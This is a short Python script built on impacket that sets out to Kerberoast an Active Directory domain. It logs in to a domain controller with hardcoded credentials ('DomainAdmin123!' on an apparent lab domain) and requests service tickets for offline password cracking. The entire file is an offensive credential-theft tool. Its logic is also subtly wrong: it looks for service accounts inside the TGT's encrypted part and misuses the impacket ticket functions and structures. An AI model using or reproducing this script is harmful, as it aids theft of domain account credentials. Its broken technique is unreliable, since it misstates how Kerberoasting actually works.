from impacket.smbconnection import SMBConnection
from impacket.krb5.asn1 import AP_REQ, TGS_REP
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.ntlm import compute_nthash

def kerberoast(username, password, domain, dc_ip):
    try:
        # Compute the NT hash of the password
        nthash = compute_nthash(password)

        # Connect to the Domain Controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Get TGT ticket for the specified user
        krbtgt_ticket = getKerberosTGT(username, nthash, domain, dc_ip)
        if krbtgt_ticket:
            print("Successfully obtained krbtgt ticket.")
            
            # Extract usernames of kerberoastable accounts from the TGT
            kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
            if kerberoastable_accounts:
                print("Kerberoastable Accounts:")
                for account in kerberoastable_accounts:
                    print(account)
                    # Kerberoast each account
                    krbtgt = krbtgt_ticket['KDC_REP']['ticket']
                    tgs_rep = getKerberosTGS(krbtgt, str(Principal(account, type=Principal.NT_PRINCIPAL)))
                    print(f"TGS_REP for {account}:")
                    print(tgs_rep.native)
            else:
                print("No kerberoastable accounts found.")
        else:
            print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def extract_kerberoastable_accounts(tgt):
    try:
        kerberoastable_accounts = []

        for ticket in tgt['enc-part']['cipher'].tickets:
            sname = str(ticket['sname'])
            if sname.startswith('service'):
                service_name = sname.split('/')[1].split('@')[0]
                kerberoastable_accounts.append(service_name)

        return kerberoastable_accounts

    except Exception as e:
        print(f"Error while extracting kerberoastable accounts: {e}")
        return []

# Example usage:
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
username = "ajman"
password = "DomainAdmin123!"
domain = "snaplabs.local"
dc_ip = "10.10.0.86"  # Replace with your domain controller's IP address

kerberoast(username, password, domain, dc_ip)